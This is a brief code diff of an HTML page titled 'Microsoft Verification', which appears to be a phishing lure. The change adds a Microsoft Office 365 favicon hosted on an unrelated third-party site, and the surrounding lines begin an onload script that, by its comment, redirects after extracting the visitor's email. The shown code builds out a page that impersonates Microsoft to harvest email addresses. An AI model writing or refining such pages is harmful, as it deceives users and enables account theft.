@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Microsoft Verification</title>
+    <link rel="icon" href="https://webtech.pt/wp-content/uploads/2020/12/microsoft-office-365-sharepoint.svg" type="image/x-icon">
     <script>
         window.onload = function() {
             // Function to handle the redirection after extracting the email
